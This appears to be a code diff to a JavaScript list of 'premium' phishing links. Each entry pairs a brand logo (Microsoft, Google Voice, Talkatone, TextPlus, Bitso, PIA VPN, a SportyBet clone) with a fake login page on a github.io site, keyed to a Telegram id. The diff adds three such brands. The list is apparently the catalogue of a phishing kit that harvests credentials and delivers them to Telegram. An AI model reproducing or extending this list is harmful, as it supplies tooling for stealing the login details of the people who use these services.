@@ -1,5 +1,8 @@
 const premiumLinks = [ 
  { name: "Microsoft Login", image: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png", urlTemplate: "https://eal876955-lgtm.github.io/npi/m/mt.htm?id={telegram-id}" },
+{ name: "TALKATONE LOGIN", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKdihiI6UETynk7yUXocw-DyCDT2SN2rzvHR93zy-arg&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/t/ta.html?id={telegram-id}" },
+{ name: "TEXT PLUS LOGIN", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiatsUYnQsRBiKkS2_MyNOAGVt57wnlUSwA9Nkx_60wA&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/te/t.html?id={telegram-id}" },
+{ name: "GOOGLE VOICE LOGIN", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5VvgqUOM_D_RCIZJUt4YFQxxsueCwJBe6Glh61tyrd5U3dtmBlBknC6J0&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/g/gv.html?id={telegram-id}" },
   { name: "Sporty bet clone Login", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9GFPuwZ7XpRmmDorr5EkOhCxjdn3SUsqHpEJs0sBnDDiyyMR5SEQyBG0&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/s/s.html?id={telegram-id}" },
 { name: "Bitso Login", image: "https://i.pinimg.com/736x/af/8f/82/af8f827d0c526b39286ebf2e199519cc.jpg", urlTemplate: "https://eal876955-lgtm.github.io/npi/b/bi.html?id={telegram-id}" },
 { name: "PIA VPN", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5aCuBswoZ3RMltfivuEVfBwRHbU57FEXAjR6QQcM0xw&s=10", urlTemplate: "https://eal876955-lgtm.github.io/npi/p/pp.html?id={telegram-id}" },
